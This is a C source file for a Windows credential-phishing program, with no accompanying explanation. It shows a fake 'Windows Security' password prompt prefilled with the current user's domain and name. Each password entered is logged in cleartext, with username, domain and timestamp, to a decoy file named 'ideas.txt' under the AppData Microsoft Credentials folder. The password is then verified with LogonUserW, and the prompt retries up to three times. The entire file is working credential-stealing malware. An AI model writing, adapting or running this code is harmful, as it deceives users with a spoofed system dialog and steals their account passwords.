#include <windows.h>
#include <wincred.h>
#include <stdio.h>
#include <time.h>
#include <shlwapi.h>
#include <shlobj.h>

#pragma comment(lib, "Credui.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Shell32.lib")

#define PASS_MAX   512
#define NAME_MAX   256
#define HOST_MAX   256

#define LOG_FILE     L"ideas.txt"
#define DIALOG_TITLE L"Windows Security"
#define DIALOG_MSG   L"Enter your password to continue"
#define FAIL_MSG     L"Login failed. %d attempt(s) left.\n"
#define MAX_TRIES    3

BOOL stash_creds(const wchar_t* user, const wchar_t* host, const wchar_t* pass) {
    wchar_t appdata[MAX_PATH];
    if (GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH) == 0)
        return FALSE;

    wchar_t path[MAX_PATH];
    PathCombineW(path, appdata, L"Microsoft\\Credentials\\" LOG_FILE);

    HANDLE f = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return FALSE;

    char* buf = (char*)calloc(4096, sizeof(char));
    if (!buf) {
        CloseHandle(f);
        return FALSE;
    }

    time_t t = time(NULL);
    struct tm tm;
    localtime_s(&tm, &t);

    int len = snprintf(buf, 4096,
        "Username: %ls\n"
        "Domain: %ls\n"
        "Password: %ls\n"
        "%04d-%02d-%02d %02d:%02d:%02d\n",
        user ? user : L"N/A",
        (host && host[0]) ? host : L"N/A",
        pass ? pass : L"N/A",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec);

    DWORD wrote = 0;
    BOOL ok = WriteFile(f, buf, min(len, 4095), &wrote, NULL) && (wrote > 0);

    free(buf);
    CloseHandle(f);
    return ok;
}


BOOL try_login(const wchar_t* user, const wchar_t* host, const wchar_t* pass) {
    if (!pass || pass[0] == L'\0') return FALSE;

    HANDLE tok = NULL;
    DWORD types[] = {
        LOGON32_LOGON_NETWORK_CLEARTEXT,
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_LOGON_NETWORK
    };

    for (int i = 0; i < 3; i++) {
        if (LogonUserW(user, (host && host[0]) ? host : NULL,
            pass, types[i], LOGON32_PROVIDER_DEFAULT, &tok)) {
            CloseHandle(tok);
            return TRUE;
        }
    }
    return FALSE;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    (void)cmd;

    wchar_t cur_user[NAME_MAX] = { 0 };
    DWORD ulen = NAME_MAX;
    GetUserNameW(cur_user, &ulen);

    wchar_t cur_host[HOST_MAX] = { 0 };
    GetEnvironmentVariableW(L"USERDOMAIN", cur_host, HOST_MAX);

    wchar_t login_display[512];
    swprintf_s(login_display, 512, L"%s\\%s", cur_host, cur_user);

    CREDUI_INFOW ui = { sizeof(CREDUI_INFOW) };
    ui.hwndParent = NULL;
    ui.pszCaptionText = DIALOG_TITLE;
    ui.pszMessageText = DIALOG_MSG;

    BOOL logged = FALSE;
    int tries = 0;

    do {
        wchar_t* pass = (wchar_t*)calloc(PASS_MAX, sizeof(wchar_t));
        if (!pass) break;

        wchar_t display[512] = { 0 };
        wcscpy_s(display, 512, login_display);

        DWORD res = CredUIPromptForCredentialsW(
            &ui,
            DIALOG_TITLE,
            NULL, 0,
            display, 512,
            pass, PASS_MAX,
            NULL,
            CREDUI_FLAGS_ALWAYS_SHOW_UI |
            CREDUI_FLAGS_KEEP_USERNAME |
            CREDUI_FLAGS_EXPECT_CONFIRMATION |
            CREDUI_FLAGS_GENERIC_CREDENTIALS |
            CREDUI_FLAGS_COMPLETE_USERNAME
        );

        if (res != NO_ERROR) {
            SecureZeroMemory(pass, PASS_MAX * sizeof(wchar_t));
            free(pass);
            if (res == ERROR_CANCELLED) break;
            tries++;
            continue;
        }

        wchar_t user[NAME_MAX] = { 0 };
        wchar_t host[HOST_MAX] = { 0 };
        {
            wchar_t tmp[512] = { 0 };
            wcscpy_s(tmp, _countof(tmp), display);
            wchar_t* slash = wcschr(tmp, L'\\');
            if (slash) {
                *slash = L'\0';
                wcscpy_s(host, HOST_MAX, tmp);
                wcscpy_s(user, NAME_MAX, slash + 1);
            }
            else {
                wcscpy_s(user, NAME_MAX, tmp);
            }
        }

        stash_creds(user, host, pass);

        if (try_login(user, host, pass)) {
            logged = TRUE;
        }
        else {
            tries++;
            if (tries < MAX_TRIES) {
                wchar_t msg[512];
                swprintf_s(msg, 512, FAIL_MSG, MAX_TRIES - tries);
                ui.pszMessageText = msg;
            }
        }

        SecureZeroMemory(pass, PASS_MAX * sizeof(wchar_t));
        free(pass);
    } while (!logged && tries < MAX_TRIES);

    return 0;
}